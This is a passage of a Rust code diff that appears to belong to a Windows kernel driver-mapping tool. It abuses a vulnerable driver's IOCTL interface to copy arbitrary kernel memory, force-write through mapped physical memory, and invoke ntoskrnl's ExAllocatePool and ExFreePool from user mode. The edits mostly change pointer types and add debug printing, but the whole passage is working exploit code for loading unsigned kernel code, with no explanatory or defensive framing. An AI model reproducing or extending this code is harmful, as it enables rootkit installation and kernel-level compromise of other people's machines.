@@ -3,7 +3,7 @@ use std::intrinsics::transmute;
 
 use winapi::{
     ctypes::c_void,
-    shared::minwindef::DWORD,
+    shared::{basetsd::SIZE_T, minwindef::DWORD},
     um::{ioapiset::DeviceIoControl, winnt::HANDLE},
 };
 
@@ -68,7 +68,7 @@ pub fn copy_memory(service: HANDLE, destination: u64, source: u64, size: u64) ->
         return false;
     }
 
-    let mut buffer = CopyMemoryBufferInfo::default();
+    let mut buffer: CopyMemoryBufferInfo = unsafe { core::mem::zeroed() };
     buffer.case_number = 0x33;
     buffer.source = source;
     buffer.destination = destination;
@@ -206,16 +206,20 @@ pub fn unmap_io_space(service: HANDLE, address: u64, size: u32) -> bool {
     }
 }
 
-pub fn read_memory(service: HANDLE, address: u64, buffer: *mut usize, size: u64) -> bool {
-    copy_memory(service, buffer as _, address, size)
+pub fn read_memory(service: HANDLE, address: u64, buffer: u64, size: u64) -> bool {
+    copy_memory(service, buffer, address, size)
 }
 
-pub fn write_memory(service: HANDLE, address: u64, buffer: *mut usize, size: u64) -> bool {
-    copy_memory(service, address, buffer as _, size)
+pub fn write_memory(service: HANDLE, address: u64, buffer: u64, size: u64) -> bool {
+    copy_memory(service, address, buffer, size)
 }
 
-pub fn force_write_memory(service: HANDLE, address: u64, buffer: *mut usize, size: u32) -> bool {
-    if address == 0 || buffer.is_null() || size == 0 {
+pub fn force_write_memory(service: HANDLE, address: u64, buffer: u64, size: u32) -> bool {
+    if address == 0 || buffer == 0 || size == 0 {
+        println!(
+            "requirements not met! {:x} -> {:x} -> {:x}",
+            address, buffer, size
+        );
         return false;
     }
 
@@ -223,7 +227,7 @@ pub fn force_write_memory(service: HANDLE, address: u64, buffer: *mut usize, siz
 
     if !get_physical_address(service, address, &mut physical_address) {
         panic!("Failed to translate virtual address!");
-    }
+    };
 
     let mapped_physical_mem = map_io_space(service, physical_address, size);
 
@@ -242,7 +246,7 @@ pub fn force_write_memory(service: HANDLE, address: u64, buffer: *mut usize, siz
 
 type ExAllocatePoolFn = unsafe extern "system" fn(i32, usize) -> *mut usize;
 
-pub fn allocate_pool(service: HANDLE, pool_type: i32, size: u64) -> u64 {
+pub fn allocate_pool(service: HANDLE, pool_type: i32, size: SIZE_T) -> u64 {
     if size == 0 {
         return 0;
     }
@@ -251,11 +255,10 @@ pub fn allocate_pool(service: HANDLE, pool_type: i32, size: u64) -> u64 {
 
     unsafe {
         if KERNEL_EX_ALLOCATE_POOL == 0 {
-            KERNEL_EX_ALLOCATE_POOL = get_kernel_module_export(
-                service,
-                get_kernel_module_address("ntoskrnl.exe") as _,
-                "ExAllocatePool",
-            );
+            let base = get_kernel_module_address("ntoskrnl.exe".to_string());
+
+            KERNEL_EX_ALLOCATE_POOL =
+                get_kernel_module_export(service, base as _, "ExAllocatePool");
         }
 
         let mut allocated_pool: u64 = 0;
@@ -265,14 +268,15 @@ pub fn allocate_pool(service: HANDLE, pool_type: i32, size: u64) -> u64 {
             &mut |address| {
                 allocated_pool =
                     (transmute::<*mut usize, ExAllocatePoolFn>(address))(pool_type, size as _) as _;
-
                 true
             },
             KERNEL_EX_ALLOCATE_POOL,
         ) {
+            println!("call kernel fn failed!");
             return 0;
         }
 
+        println!("Allocated pool: {:x}", allocated_pool);
         allocated_pool
     }
 }
@@ -290,7 +294,7 @@ pub fn free_pool(service: HANDLE, addy: u64) -> bool {
         if KERNEL_EX_FREE_POOL == 0 {
             KERNEL_EX_FREE_POOL = get_kernel_module_export(
                 service,
-                get_kernel_module_address("ntoskrnl.exe") as _,
+                get_kernel_module_address("ntoskrnl.exe".to_string()) as _,
                 "ExFreePool",
             );
         }
